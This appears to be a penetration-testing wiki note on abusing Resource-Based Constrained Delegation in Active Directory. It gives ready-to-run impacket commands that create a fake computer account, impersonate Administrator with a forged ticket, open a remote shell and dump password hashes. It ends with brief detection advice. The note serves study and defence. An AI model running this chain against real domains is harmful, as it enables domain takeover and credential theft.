# Resource-Based Constrained Delegation (RBCD)

## What it is

Resource-Based Constrained Delegation is a Kerberos extension that lets a **resource** (a computer object in Active Directory) declare which other accounts are trusted to impersonate users when accessing it. This is controlled by the attribute:

```
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Unlike classic constrained delegation (where the *front-end service* is configured by a Domain Admin), RBCD is configured **on the target resource itself** — meaning anyone with write access to that attribute can configure it.

## Why it matters for attackers

If an attacker has **write access** to `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target computer (e.g. via `GenericAll`, `GenericWrite`, or `WriteProperty`), they can:

1. Name any account they control as a trusted delegator
2. Use S4U2Self + S4U2Proxy to request a Kerberos ticket **impersonating any domain user** (including Domain Admins) for services on the target
3. Use that ticket to authenticate to the target as the impersonated user — without knowing their password

## Prerequisites

| Requirement | How it's satisfied in practice |
|-------------|-------------------------------|
| Write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target | `GenericAll`, `GenericWrite`, or `WriteProperty` ACE on the target computer object |
| A controlled account with a Service Principal Name (SPN) | Create a computer account — any domain user can create up to 10 by default (`ms-DS-MachineAccountQuota = 10`) |

## Attack Steps

### 1. Create a fake computer account (if needed)

```bash
impacket-addcomputer <domain>/<any_user>:'<password>' \
  -computer-name 'FAKE01$' -computer-pass 'Fakepass123!' \
  -dc-ip <dc-ip>
```

### 2. Write RBCD config on the target computer object

Must be run with credentials that hold write access to the target's AD object:

```bash
impacket-rbcd \
  -delegate-from 'FAKE01$' \
  -delegate-to '<TARGET_COMPUTER>$' \
  -action write \
  -dc-ip <dc-ip> \
  <domain>/<privileged_user>:'<password>'
```

### 3. Request a service ticket impersonating a privileged user

```bash
impacket-getST \
  -spn cifs/<target-fqdn> \
  -impersonate Administrator \
  <domain>/'FAKE01$':'Fakepass123!' \
  -dc-ip <dc-ip>
```

Produces a `.ccache` Kerberos ticket file.

### 4. Use the ticket

```bash
export KRB5CCNAME=Administrator@cifs_<target>@<DOMAIN>.ccache

# Remote shell:
impacket-psexec -k -no-pass <domain>/administrator@<target-fqdn> -dc-ip <dc-ip>

# Or secretsdump for hashes:
impacket-secretsdump -k -no-pass <domain>/administrator@<target-fqdn> -dc-ip <dc-ip>
```

## Detection / Defensive Notes

- `msDS-AllowedToActOnBehalfOfOtherIdentity` being written on sensitive computer objects (especially DCs) should trigger an alert
- Audit `ms-DS-MachineAccountQuota` — setting it to 0 removes the default create-computer-account ability from regular users
- Monitor for new computer accounts created by non-admin users

## Related

- [[GenericAll ACL Abuse]]
- [[BloodHound — Active Directory Enumeration]]
- [[evil-winrm]]
- [[impacket]]
